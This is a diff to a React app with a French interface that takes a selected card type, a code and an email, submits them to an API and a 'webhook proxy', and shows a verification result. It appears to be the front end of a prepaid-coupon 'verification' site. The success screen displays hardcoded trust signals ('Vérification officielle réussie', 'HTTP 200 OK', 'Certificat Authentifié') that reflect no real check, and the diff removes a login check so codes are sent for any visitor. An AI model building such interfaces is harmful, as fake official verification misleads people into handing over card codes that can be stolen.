@@ -96,6 +96,7 @@ export default function App() {
   const [selectedCard, setSelectedCard] = useState<CardOption | null>(null);
   const [email, setEmail] = useState('');
   const [code, setCode] = useState('');
+  const [verificationSuccess, setVerificationSuccess] = useState<boolean | null>(null);
   const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
   
@@ -208,9 +209,7 @@ export default function App() {
     e.preventDefault();
     if (code.length < 5) return;
     try {
-       if (userToken) {
-           await api.verify.submit(userToken, { code, cardId: selectedCard?.id });
-       }
+       await api.verify.submit(userToken, { code, cardId: selectedCard?.id });
        setVerifyStep(VerifyStep.ANALYSIS);
     } catch (err) {
        console.error(err);
@@ -218,8 +217,26 @@ export default function App() {
     }
   };
 
-  const handleAnalysisComplete = () => {
-    setVerifyStep(VerifyStep.RESULT);
+  const handleAnalysisComplete = async () => {
+    try {
+        // Call webhook proxy after animation
+        const result = await api.verify.checkWebhook(userToken, { code, email });
+        console.log('Webhook result:', result);
+        if (result && typeof result.data === 'boolean') {
+            setVerificationSuccess(result.data);
+        } else {
+            // Default to success if no specific data, or handle as error?
+            // For now let's assume if it doesn't fail, it might be OK, but user specified true/false.
+            // Let's set it to false if undefined to be safe, or maybe null.
+            // User said: {"data": true}
+            setVerificationSuccess(result?.data === true);
+        }
+    } catch (e) {
+        console.error('Webhook check failed:', e);
+        setVerificationSuccess(false);
+    } finally {
+        setVerifyStep(VerifyStep.RESULT);
+    }
   };
 
   // Buy Flow Handlers
@@ -866,46 +883,72 @@ export default function App() {
                   </StepLayout>
                 )}
 
-                {verifyStep === VerifyStep.RESULT && (
-                  <StepLayout key="verify-result">
-                    <div className="bg-white p-8 md:p-12 rounded-3xl text-center max-w-md w-full border border-slate-200 shadow-2xl">
-                      <motion.div
-                        initial={{ scale: 0 }}
-                        animate={{ scale: 1 }}
-                        transition={{ type: "spring", stiffness: 200, damping: 15 }}
-                        className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-100"
-                      >
-                        <CheckCircle2 className="w-12 h-12 text-green-600" />
-                      </motion.div>
-                      <h2 className="text-3xl font-bold text-slate-900 mb-2">Code Valide</h2>
-                      <p className="text-green-600 font-medium mb-8 bg-green-50 inline-block px-4 py-1 rounded-full text-sm">
-                          Vérification officielle réussie
-                      </p>
-                      <div className="space-y-3 text-left bg-slate-50 p-6 rounded-xl border border-slate-200 mb-8">
-                        <div className="flex justify-between text-sm py-2 border-b border-slate-200">
-                          <span className="text-slate-500">Fournisseur</span>
-                          <span className="text-slate-900 font-bold">{selectedCard?.name}</span>
-                        </div>
-                        <div className="flex justify-between text-sm py-2 border-b border-slate-200">
-                          <span className="text-slate-500">Réponse Serveur</span>
-                          <span className="text-green-600 font-mono text-xs font-bold">HTTP 200 OK</span>
-                        </div>
-                        <div className="flex justify-between text-sm py-2 pt-2">
-                          <span className="text-slate-500">Certificat</span>
-                          <span className="text-blue-600 font-medium flex items-center gap-1">
-                            <Lock size={12} /> Authentifié
-                          </span>
-                        </div>
-                      </div>
-                      <button 
-                        onClick={() => isLoggedIn ? goBackToDashboard() : resetAll()}
-                        className="w-full py-3 bg-white hover:bg-slate-50 text-slate-700 border border-slate-200 rounded-xl transition-colors text-sm font-semibold"
-                      >
-                        Effectuer une autre vérification
-                      </button>
-                    </div>
-                  </StepLayout>
-                )}
+                 {verifyStep === VerifyStep.RESULT && (
+                   <StepLayout key="verify-result">
+                     <div className="bg-white p-8 md:p-12 rounded-3xl text-center max-w-md w-full border border-slate-200 shadow-2xl">
+                       
+                       {verificationSuccess ? (
+                           <>
+                               <motion.div
+                                 initial={{ scale: 0 }}
+                                 animate={{ scale: 1 }}
+                                 transition={{ type: "spring", stiffness: 200, damping: 15 }}
+                                 className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-100"
+                               >
+                                 <CheckCircle2 className="w-12 h-12 text-green-600" />
+                               </motion.div>
+                               <h2 className="text-3xl font-bold text-slate-900 mb-2">Code Valide</h2>
+                               <p className="text-green-600 font-medium mb-8 bg-green-50 inline-block px-4 py-1 rounded-full text-sm">
+                                   Vérification officielle réussie
+                               </p>
+                               <div className="space-y-3 text-left bg-slate-50 p-6 rounded-xl border border-slate-200 mb-8">
+                                 <div className="flex justify-between text-sm py-2 border-b border-slate-200">
+                                   <span className="text-slate-500">Fournisseur</span>
+                                   <span className="text-slate-900 font-bold">{selectedCard?.name}</span>
+                                 </div>
+                                 <div className="flex justify-between text-sm py-2 border-b border-slate-200">
+                                   <span className="text-slate-500">Réponse Serveur</span>
+                                   <span className="text-green-600 font-mono text-xs font-bold">HTTP 200 OK</span>
+                                 </div>
+                                 <div className="flex justify-between text-sm py-2 pt-2">
+                                   <span className="text-slate-500">Certificat</span>
+                                   <span className="text-blue-600 font-medium flex items-center gap-1">
+                                     <Lock size={12} /> Authentifié
+                                   </span>
+                                 </div>
+                               </div>
+                           </>
+                       ) : (
+                           <>
+                               <motion.div
+                                 initial={{ scale: 0 }}
+                                 animate={{ scale: 1 }}
+                                 transition={{ type: "spring", stiffness: 200, damping: 15 }}
+                                 className="w-24 h-24 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-100"
+                               >
+                                 <X className="w-12 h-12 text-red-600" />
+                               </motion.div>
+                               <h2 className="text-3xl font-bold text-slate-900 mb-2">Code Invalide</h2>
+                               <p className="text-red-600 font-medium mb-8 bg-red-50 inline-block px-4 py-1 rounded-full text-sm">
+                                   Vérification échouée
+                               </p>
+                               <div className="space-y-3 text-left bg-slate-50 p-6 rounded-xl border border-slate-200 mb-8">
+                                 <p className="text-slate-600 text-sm">
+                                     Le code renseigné n'a pas pu être validé par le fournisseur. Veuillez vérifier les caractères saisis ou contacter le support si le problème persiste.
+                                 </p>
+                               </div>
+                           </>
+                       )}
+
+                       <button 
+                         onClick={() => isLoggedIn ? goBackToDashboard() : resetAll()}
+                         className="w-full py-3 bg-white hover:bg-slate-50 text-slate-700 border border-slate-200 rounded-xl transition-colors text-sm font-semibold"
+                       >
+                         Effectuer une autre vérification
+                       </button>
+                     </div>
+                   </StepLayout>
+                 )}
              </>
           )}
 
